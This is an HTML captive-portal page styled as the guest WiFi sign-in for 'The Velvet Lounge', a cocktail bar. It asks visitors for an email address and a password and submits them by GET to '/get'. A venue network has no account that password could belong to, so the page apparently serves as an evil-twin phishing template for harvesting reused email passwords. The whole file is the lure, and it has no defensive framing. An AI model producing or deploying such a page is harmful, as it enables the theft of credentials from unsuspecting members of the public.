<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>The Velvet Lounge — WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#100814;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:390px;background:#18101e;border:1px solid #2a1a3a;border-radius:16px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,0.7)}
.top{padding:30px 28px 22px;text-align:center;border-bottom:1px solid #2a1a3a}
.lounge-icon{font-size:28px;margin-bottom:12px}
.lounge-name{font-size:22px;font-weight:700;color:#e0d0f0;letter-spacing:2px}
.lounge-sub{font-size:9.5px;color:#5a3a6a;letter-spacing:2.5px;text-transform:uppercase;margin-top:6px}
.pill{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,0.04);border:1px solid #2a1a3a;border-radius:20px;padding:5px 14px;margin-top:14px}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.pill span{font-size:11px;color:#4a2a5a}
.pill strong{color:#8a5a9a;font-weight:500}
.body{padding:26px 28px 22px}
h2{font-size:16px;font-weight:700;color:#c0a8d8;margin-bottom:4px}
.sub{font-size:12.5px;color:#4a2a5a;margin-bottom:18px}
.lbl{display:block;font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:1.5px;color:#4a2a5a;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1px solid #2a1a3a;border-radius:8px;font-size:14.5px;background:#100814;color:#c0a8d8}
input:focus{outline:none;border-color:#8a5a9a;box-shadow:0 0 0 3px rgba(138,90,154,0.12)}
input::placeholder{color:#2a1a3a}
.btn{width:100%;padding:13px;margin-top:22px;border:none;border-radius:8px;background:linear-gradient(135deg,#6a2a8a,#9a3a9a);color:#fff;font-size:13px;font-weight:700;cursor:pointer}
.terms{font-size:11px;color:#3a1a4a;text-align:center;margin-top:13px;line-height:1.6}
.terms a{color:#8a5a9a}
.foot{background:#100814;border-top:1px solid #2a1a3a;padding:12px 28px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#3a1a4a;text-decoration:none}
.foot a{color:#6a4a7a}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="lounge-icon">🍸</div>
    <div class="lounge-name">The Velvet</div>
    <div class="lounge-sub">Bar &bull; Cocktail Lounge &bull; WiFi</div>
    <div class="pill"><div class="dot"></div><span>Network: <strong>Velvet-Lounge</strong></span></div>
  </div>
  <div class="body">
    <h2>Lounge WiFi Access</h2>
    <p class="sub">Sign in to enjoy our complimentary network.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect to WiFi</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; The Velvet Lounge</span><a href="#">Help</a></div>
</div>
</body>
</html>
